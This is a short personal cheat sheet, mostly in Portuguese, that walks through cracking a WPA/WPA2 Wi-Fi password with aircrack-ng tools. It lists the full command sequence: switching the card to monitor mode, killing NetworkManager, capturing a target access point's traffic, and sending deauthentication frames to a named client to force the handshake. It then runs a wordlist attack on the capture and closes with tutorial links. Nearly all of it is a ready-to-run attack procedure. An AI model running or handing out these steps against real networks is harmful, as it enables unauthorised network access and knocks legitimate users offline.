    ## WPA/2 ##

## Ver a interface de rede sem fio (Neste caso é wlan0)
ifconfig
iwconfig
airmon-ng

## Iniciar a interface (wlan0) em modo monitor (para ser possível capturar todo pacotes
    # Irá criar uma "nova" interface em modo monitor, neste caso wlan0mon
airmon-ng start wlan0


## Termine todo programas secundário que pode atrapalhar na captura
    # Por exemplo NetworkManager e wpa_supplicant
        # killall NetworkManager
        # killall wpa_supplicant

    ## Pelo airmon-ng
airmon-ng check kill

## Iniciar a captura de pacotes, airodump <interface>
airodump-ng wlan0mon
    # Listar apenas de uma rede, nestecaso topcom2016
    airodump-ng wlan0mon --essid topcom2016

    # -c channel -w output file --bssid mac do AP, wlan0mon - interface name
airodump-ng -c 6 --bssid 64:66:B3:70:9F:C8 -w psk wlan0mon

## Caso tenho dos dispositivos reconecte na rede para pegar os 4-way handshake, envie um deauthentication
aireplay-ng -0 1 -a 64:66:B3:70:9F:C8 -c C0:18:85:E7:D0:F3 wlan0mon

## -0 means deauthentication
## 1 is the number of deauths to send (you can send multiple if you wish), 0 means send them continuously
## -a MAC address of the access point
## -c MAC address of the client you are deauthing
## wlan0mon is the interface name

## Tentativa de quebra utiliza wordlists
    # Sem os 4-way handshake
aircrack-ng -w BIG-WPA-LIST-1 psk-01.cap

    # Com os 4-way handshake e wordlist sem a senha "correta"
aircrack-ng -w BIG-WPA-LIST-1 psk-01.cap

    # Com os 4-way handshake e wordlist com a senha "correta"
aircrack-ng -w BIG-WPA-LIST-1_s psk-02.cap

## Good links
http://www.aircrack-ng.org/doku.php?id=cracking_wpa
http://www.wirelessdomination.com/how-to-crack-wpa2-wifi-password-using-reaver-wpa2/
http://www.aircrack-ng.org/doku.php?id=aireplay-ng
http://www.aircrack-ng.org/doku.php?id=deauthentication
http://mrncciew.com/2014/08/16/decrypt-wpa2-psk-using-wireshark/
http://media.pearsoncmg.com/ph/streaming/esm/tanenbaum5e_videonotes/tanenbaum_videoNotes.html
https://pentestlab.wordpress.com/2012/07/12/creating-wordlists-with-crunch/
https://www.wireshark.org/faq.html
https://anderse.wordpress.com/2011/10/24/cracking-wifi-wep-wpawpa2-networks/
